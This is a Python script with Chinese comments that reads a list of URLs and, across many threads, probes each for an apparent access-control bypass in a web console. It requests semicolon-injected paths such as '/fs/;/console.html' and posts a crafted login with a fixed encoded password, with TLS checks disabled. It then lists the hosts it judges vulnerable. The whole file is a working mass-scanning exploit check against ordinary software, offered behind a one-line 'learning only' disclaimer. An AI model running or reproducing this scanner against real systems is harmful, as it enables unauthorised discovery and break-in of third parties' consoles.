import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 10  # 请求超时时间（秒）
lock = threading.Lock()
vulnerable_assets = []  # 保存存在漏洞的资产

def check_vulnerability(url):
    headers = {
        'Host': 'example.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Connection': 'close'
    }
    console_url = f"{url}/fs/;/console.html"
    login_url = f"{url}/fs/;/console"
    try:
        # 访问控制台页面
        console_request = requests.get(console_url, headers=headers, timeout=TIMEOUT, verify=False)
        # 构造登录请求
        headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        data = {
            'operType': 'login',
            'username': '123',
            'password': '%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D'
        }
        # 发送登录请求
        login_request = requests.post(login_url, headers=headers, data=data, timeout=TIMEOUT, verify=False)
        if login_request.status_code == 200 and login_request.json().get('login') == 'false':
            with lock:
                vulnerable_assets.append(url)
                print(colored(f"在 {url} 存在漏洞", "red"))
        else:
            with lock:
                print(f"{url} 未发现漏洞")
    except requests.exceptions.Timeout:
        with lock:
            print(f"请求 {url} 时出现异常：连接超时")
    except requests.exceptions.RequestException:
        with lock:
            print(f"请求 {url} 时出现异常")

def batch_scan(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    urls = [url.strip() for url in urls]

    print("开始批量检测...")
    
    with ThreadPoolExecutor() as executor:
        executor.map(check_vulnerability, urls)

    # 打印存在漏洞的资产
    print("\n存在漏洞的资产列表：")
    for asset in vulnerable_assets:
        print(asset)

if __name__ == '__main__':
    print("该脚本仅用于学习和安全排查，请勿非法攻击！")
    file_path = 'urls.txt'
    batch_scan(file_path)
